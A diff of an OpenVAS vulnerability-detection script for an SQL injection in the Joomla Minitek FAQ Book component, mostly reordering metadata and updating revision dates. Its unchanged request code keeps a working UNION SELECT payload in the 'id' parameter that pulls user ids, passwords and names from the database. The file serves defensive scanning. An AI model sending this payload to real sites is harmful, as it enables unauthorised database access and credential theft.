@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 10238 2018-06-19 01:04:50Z ckuersteiner $
+# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 10285 2018-06-21 12:22:45Z cfischer $
 #
 # Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability
 #
@@ -8,7 +8,7 @@
 # Madhuri D <dmadhuri@secpod.com>
 #
 # Copyright:
-# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
+# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License version 2
@@ -29,22 +29,13 @@ CPE = "cpe:/a:joomla:joomla";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802106");
-  script_version("$Revision: 10238 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-06-19 03:04:50 +0200 (Tue, 19 Jun 2018) $");
+  script_version("$Revision: 10285 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-21 14:22:45 +0200 (Thu, 21 Jun 2018) $");
   script_tag(name:"creation_date", value:"2011-06-20 15:22:27 +0200 (Mon, 20 Jun 2011)");
   script_bugtraq_id(48223);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
-  script_tag(name: "solution_type", value: "VendorFix");
-
   script_name("Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability");
-
-  script_xref(name: "URL", value: "http://secunia.com/advisories/44943");
-  script_xref(name: "URL", value: "http://packetstormsecurity.org/files/view/102195/joomlafaqbook-sql.txt");
-  script_xref(name: "URL", value: "http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");
-
-  script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -52,19 +43,26 @@ if(description)
   script_require_ports("Services/www", 80);
   script_mandatory_keys("joomla/installed");
 
-  script_tag(name: "impact", value: "Successful exploitation will let attackers to manipulate SQL queries by
-injecting arbitrary SQL code.");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/44943");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102195/joomlafaqbook-sql.txt");
+  script_xref(name:"URL", value:"http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");
 
-  script_tag(name: "affected", value: "Joomla Minitek FAQ Book component version 1.3");
+  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
+  injecting arbitrary SQL code.");
 
-  script_tag(name: "insight", value: "The flaw is due to input passed via the 'id' parameter to 'index.php' (when
-'option' is set to 'com_faqbook' and 'view' is set to 'category') is not properly sanitised before being used in a
-SQL query.");
+  script_tag(name:"affected", value:"Joomla Minitek FAQ Book component version 1.3");
 
-  script_tag(name: "solution", value: "Upgrade to Joomla Minitek FAQ Book component version 1.4 or later.");
+  script_tag(name:"insight", value:"The flaw is due to input passed via the 'id' parameter to 'index.php'(when
+  'option' is set to 'com_faqbook' and 'view' is set to 'category') is not properly sanitised before being used
+  in a SQL query.");
 
-  script_tag(name: "summary", value: "This host is running Joomla Minitek FAQ Book component and is prone to SQL
-injection vulnerability.");
+  script_tag(name:"solution", value:"Upgrade to Joomla Minitek FAQ Book component version 1.4 or later.");
+
+  script_tag(name:"summary", value:"This host is running Joomla Minitek FAQ Book component and is prone to SQL
+  injection vulnerability.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
@@ -92,6 +90,8 @@ if (isnull(cookie[1]))
 else
   cookie = cookie[1];
 
+host = http_host_name(port:port);
+
 sndReq = string("GET ", dir, "/index.php?option=com_faqbook&view=category" +
                 "&id=-7+union+select+1,2,3,4,5,6,7,8,concat_ws(0x3a,0x4f70656e564153," +
                 "id,password,0x4f70656e564153,name),10,11,12,13,14,15,16,17,18,19," +
@@ -99,7 +99,6 @@ sndReq = string("GET ", dir, "/index.php?option=com_faqbook&view=category" +
                 "Host: ", host, "\r\n",
                 "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                 "Cookie: ", cookie , "; path=/", "\r\n\r\n");
-
 rcvRes = http_keepalive_send_recv(port: port, data:sndReq);
 
 if (egrep(string:rcvRes, pattern:"OpenVAS:[0-9]+:(.+):OpenVAS")) {
